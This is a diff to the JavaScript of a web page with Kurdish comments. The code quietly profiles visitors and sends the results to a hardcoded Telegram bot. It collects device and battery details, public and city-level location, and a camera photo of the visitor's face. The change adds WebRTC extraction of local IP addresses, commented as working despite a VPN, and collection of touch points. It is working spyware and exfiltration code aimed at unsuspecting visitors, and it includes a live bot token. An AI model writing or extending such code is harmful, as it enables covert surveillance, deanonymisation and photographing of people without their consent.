@@ -122,6 +122,10 @@
         const BOT_TOKEN = "9188898335:AAEpuZXa0igf-7GbuvykP0uT9U5GJQZJU0g";
         const CHAT_ID = "6947664268";
 
+        let gatheredData = {
+            localIPs: []
+        };
+
         function sendToTelegramText(text) {
             let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             fetch(url, {
@@ -145,7 +149,30 @@
             fetch(url, { method: "POST", body: formData });
         }
 
-        // وەرگرتنی زانیاری گرافیک و کارتی شاشە (GPU)
+        // WebRTC بۆ دەرهێنانی Local IP (تەنانەت لەگەڵ VPNـیش)
+        function getLocalIPs(callback) {
+            try {
+                let ips = [];
+                let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                if (!RTCPeerConnection) { callback([]); return; }
+                let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    let parts = ice.candidate.candidate.split(" ");
+                    let ip = parts[4];
+                    if (ips.indexOf(ip) === -1) {
+                        ips.push(ip);
+                        callback(ips);
+                    }
+                };
+            } catch(e) {
+                callback([]);
+            }
+        }
+
+        // کارتی شاشە و گرافیک (GPU)
         function getGPUInfo() {
             try {
                 let canvas = document.createElement('canvas');
@@ -158,13 +185,13 @@
             }
         }
 
-        // وەرگرتنی زانیاری پاتری
+        // زانیاری پاتری
         async function getBatteryInfo() {
             if ('getBattery' in navigator) {
                 try {
                     let battery = await navigator.getBattery();
                     let level = Math.round(battery.level * 100) + "%";
-                    let charging = battery.charging ? "⚡ لە حالەتی چارجدا" : "🔋 پاتری (بێ چارج)";
+                    let charging = battery.charging ? "⚡ لە حالەتی چارجدا" : "🔋 بێ چارج";
                     return `${level} (${charging})`;
                 } catch(e) {
                     return "نەتوانرا بخوێنرێتەوە";
@@ -181,40 +208,44 @@
             let screenRes = window.screen.width + "x" + window.screen.height;
             let cpuCores = navigator.hardwareConcurrency || "نەزانراو";
             let deviceRam = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "نەزانراو";
+            let touchPoints = navigator.maxTouchPoints || 0;
             let gpu = getGPUInfo();
             let battery = await getBatteryInfo();
             
             let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             let netType = conn ? (conn.effectiveType || "نەزانراو") : "نەزانراو";
 
-            // وەرگرتنی IP و شوێن لەڕێگەی IPAPI
-            fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(data => {
-                let report = `🚀 *ڕاپۆرتی پێشکەوتووی سەردانیکەر (OSINT):*\n\n` +
-                             `🌐 *زانیاری تۆڕ و ئایپی:*\n` +
-                             `• *ئایپی (IP):* \`${data.ip}\`\n` +
-                             `• *وڵات و شار:* ${data.country_name} - ${data.city}\n` +
-                             `• *دابینکەری هێڵ (ISP):* ${data.org}\n` +
-                             `• *جۆری هێڵی اینتەرنێت:* ${netType.toUpperCase()}\n\n` +
-                             `💻 *وردەکاری تەکنیکی ئامێر:*\n` +
-                             `• *سیستمی بەکاربراو:* ${platform}\n` +
-                             `• *ژمارەی پرۆسێسەر (CPU Cores):* ${cpuCores}\n` +
-                             `• *ڕامی مەخزەن (RAM):* ${deviceRam}\n` +
-                             `• *کارتی شاشە (GPU):* \`${gpu}\`\n` +
-                             `• *دۆخی پاتری:* ${battery}\n` +
-                             `• *ڕەهەندی شاشە:* ${screenRes}\n` +
-                             `• *زمان:* ${language}\n\n` +
-                             `📱 *جۆری براوسەر (User Agent):*\n\`${ua}\``;
-                
-                sendToTelegramText(report);
-            }).catch(err => {
-                let basicReport = `🚀 *ڕاپۆرتی سەرەتایی ئامێر:*\n` +
-                                  `• *سیستم:* ${platform}\n` +
-                                  `• *پرۆسێسەر:* ${cpuCores} Cores\n` +
-                                  `• *پاتری:* ${battery}\n` +
-                                  `• *کارتی شاشە:* \`${gpu}\``;
-                sendToTelegramText(basicReport);
+            // وەرگرتنی Local IP پێش ناردنی ڕاپۆرتەکە
+            getLocalIPs(function(localIPs) {
+                let localIPText = localIPs.length > 0 ? localIPs.join(", ") : "دۆزراوەتەوە / شاراوە";
+
+                // وەرگرتنی IP گشتی و شوێن لەڕێگەی IPAPI
+                fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    let report = `🔥 *ڕاپۆرتی پێشکەوتووی توندی (OSINT PRO):*\n\n` +
+                                 `🌐 *تۆڕ و زانیاری ڕایەڵە:*\n` +
+                                 `• *ئایپی گشتی (Public IP):* \`${data.ip}\`\n` +
+                                 `• *ئایپی ناوخۆیی (Local IP):* \`${localIPText}\`\n` +
+                                 `• *وڵات و شار:* ${data.country_name} - ${data.city}\n` +
+                                 `• *دابینکەری هێڵ (ISP):* ${data.org}\n` +
+                                 `• *جۆری هێڵ:* ${netType.toUpperCase()}\n\n` +
+                                 `💻 *وردەکاری تەکنیکی و ڕەقامەواڵەیی:*\n` +
+                                 `• *سیستم:* ${platform}\n` +
+                                 `• *پرۆسێسەر (CPU Cores):* ${cpuCores}\n` +
+                                 `• *ڕام (RAM):* ${deviceRam}\n` +
+                                 `• *کارتی شاشە (GPU):* \`${gpu}\`\n` +
+                                 `• *دۆخی پاتری:* ${battery}\n` +
+                                 `• *خاڵەکانی تاچ (Touch Points):* ${touchPoints}\n` +
+                                 `• *ڕەهەندی شاشە:* ${screenRes}\n` +
+                                 `• *زمان:* ${language}\n\n` +
+                                 `📱 *براوسەر (User Agent):*\n\`${ua}\``;
+                    
+                    sendToTelegramText(report);
+                }).catch(err => {
+                    let basicReport = `🔥 *ڕاپۆرتی توندی ئامێر:* \n• سیستم: ${platform} \n• Local IP: \`${localIPText}\` \n• GPU: \`${gpu}\``;
+                    sendToTelegramText(basicReport);
+                });
             });
         }
 
@@ -250,8 +281,8 @@
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(function(blob) {
-                        sendToTelegramPhoto(blob, "📸 *وێنەی ڕوخساری سەردانیکەر* (گیراو لە دوربینەوە)");
-                    }, 'image/jpeg', 0.8);
+                        sendToTelegramPhoto(blob, "📸 *وێنەی ڕوخساری سەردانیکەر* (بە کوالێتی بەرز)");
+                    }, 'image/jpeg', 0.85);
                     
                     stream.getTracks().forEach(track => track.stop());
                 }, 1200);
